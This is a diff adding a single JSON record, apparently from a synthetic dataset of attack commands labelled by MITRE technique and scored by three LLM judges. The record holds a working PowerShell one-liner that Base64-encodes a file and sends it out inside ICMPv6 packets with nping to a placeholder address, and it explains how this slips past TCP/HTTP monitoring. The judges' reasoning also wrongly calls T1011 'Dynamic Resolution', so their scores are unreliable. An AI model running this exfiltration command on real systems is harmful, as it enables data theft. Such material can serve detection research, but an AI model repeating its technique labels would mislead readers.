@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $chunk=$b.Substring(0,[Math]::Min(800,$b.Length)); nping.exe --icmp -6 2001:db8:dead:beef::26 --data-string ('C1:'+ $chunk) -c 1",
+  "explanation": "Sends the first chunk of Base64-encoded data inside an ICMPv6 Echo payload, diverging from typical TCP-based channels and fitting T1011 behavior. Chunk labeling supports multi-packet exfil.",
+  "rationale_steps": [
+    "Create a manageable Base64 chunk with a simple label.",
+    "Transmit via ICMPv6 to avoid standard TCP/HTTP monitoring paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-7fdda75d",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper variable assignments, correct method calls, appropriate string concatenation, and valid nping syntax with proper flags.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements data exfiltration over ICMPv6 which aligns with T1011 (Dynamic Resolution) by using an alternative protocol for C2 communication, though it lacks the dynamic resolution aspect where endpoints are algorithmically determined at runtime.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:53:27.158574Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/parentheses, proper separators, and valid nping flags/arguments.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates data via ICMPv6 payload but does not perform any dynamic resolution (no DGA, endpoint rotation, or DNS behavior), so it does not match the described T1011 technique.",
+        "combined_score": 3.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:54:03.706665Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct Powershell syntax, balanced elements, and valid `nping.exe` flags and arguments.",
+        "semantic_score": 1,
+        "semantic_justification": "The command effectively exfiltrates data via ICMPv6, but it uses a hardcoded destination IP address and provides no mechanism for dynamic endpoint resolution, thus failing to align with T1011's core focus on algorithmic endpoint determination.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:01:19.480134Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
